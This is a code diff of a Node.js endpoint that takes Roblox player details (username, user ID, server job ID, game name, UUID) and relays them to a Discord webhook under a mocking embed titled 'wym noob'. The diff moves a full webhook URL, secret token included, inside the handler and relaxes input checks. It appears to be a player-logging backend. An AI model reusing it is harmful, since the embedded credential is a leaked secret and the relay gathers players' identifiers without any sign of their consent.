@@ -1,7 +1,3 @@
-const fetch = require('node-fetch');
-
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1532312629136326697/abaI-Xce0WrA3_AvxmFk1CIHWZjIminXo39GY3kwW11vTgM1n-pZZi3ZXWL8e_ya9xtI";
-
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -23,13 +19,15 @@ module.exports = async (req, res) => {
         try {
             const data = req.body;
             
-            if (!data.username || !data.userid) {
+            console.log('Received from Roblox:', data);
+
+            if (!data.username) {
                 return res.status(400).json({ 
-                    error: 'Missing required fields: username and userid are required' 
+                    error: 'Missing username' 
                 });
             }
 
-            console.log('Received from Roblox:', data);
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1532312629136326697/abaI-Xce0WrA3_AvxmFk1CIHWZjIminXo39GY3kwW11vTgM1n-pZZi3ZXWL8e_ya9xtI";
 
             const embed = {
                 title: "wym noob",
@@ -37,7 +35,7 @@ module.exports = async (req, res) => {
                 fields: [
                     {
                         name: "wym so noob",
-                        value: `\`\`\`\nUsername: ${data.username}\nDisplay: ${data.display || data.username}\nUserID: ${data.userid}\nJobID: ${data.jobid || 'Unknown'}\nGameName: ${data.gamename || 'Unknown'}\nUUID: ${data.uuid || 'N/A'}\n\`\`\``,
+                        value: `\`\`\`\nUsername: ${data.username || 'Unknown'}\nDisplay: ${data.display || data.username || 'Unknown'}\nUserID: ${data.userid || 'Unknown'}\nJobID: ${data.jobid || 'Unknown'}\nGameName: ${data.gamename || 'Unknown'}\nUUID: ${data.uuid || 'N/A'}\n\`\`\``,
                         inline: false
                     }
                 ],
